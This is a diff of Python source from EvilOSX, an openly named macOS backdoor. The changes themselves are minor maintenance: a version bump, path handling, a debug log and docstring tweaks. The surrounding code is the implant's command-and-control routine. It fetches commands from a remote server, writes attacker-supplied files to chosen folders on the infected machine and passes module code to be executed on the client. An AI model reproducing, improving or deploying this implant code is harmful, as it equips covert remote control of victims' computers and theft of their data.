@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "2.1.2"
+__version__ = "3.1.2"
 
 import time
 import urllib2
@@ -63,7 +63,6 @@ def receive_command():
     request = urllib2.Request(url=request_path, headers=headers, data=data)
     response = urllib2.urlopen(request, cafile=get_ca_file())
 
-    response_line = response.readline().replace("\n", "")  # Can't be read twice.
     response_headers = response.info().dict
 
     if "content-disposition" in response_headers and "attachment" in response_headers["content-disposition"]:
@@ -72,7 +71,9 @@ def receive_command():
 
         output_folder = os.path.expanduser(decoded_header.split(":")[1])
         output_name = os.path.basename(decoded_header.split(":")[2])
-        output_file = output_folder + "/" + output_name
+        output_file = os.path.join(output_folder, output_name)
+
+        log.debug("Attempting to write to: %s", output_file)
 
         if not os.path.exists(output_folder):
             send_response(MESSAGE_ATTENTION + "Failed to upload file: invalid output folder.", "upload")
@@ -90,6 +91,8 @@ def receive_command():
             send_response(MESSAGE_INFO + "File written to: " + output_file, "upload")
         return None
     else:
+        response_line = response.read().decode()  # Can't be read twice.
+
         if not response_line or response_line == "You dun goofed.":
             return None
         else:
@@ -107,10 +110,10 @@ class Command:
 
     def __init__(self, client_id, command, module_name="", is_task=False):
         """
-        :param client_id The ID of the client which should execute this command.
-        :param command The command (or module code) to execute on the client.
-        :param module_name The name of the module being executed.
-        :param is_task True if this module is a task.
+        :param client_id: The ID of the client which should execute this command.
+        :param command: The command (or module code) to execute on the client.
+        :param module_name: The name of the module being executed.
+        :param is_task: True if this module is a task.
         """
         self.id = client_id
         self.command = command
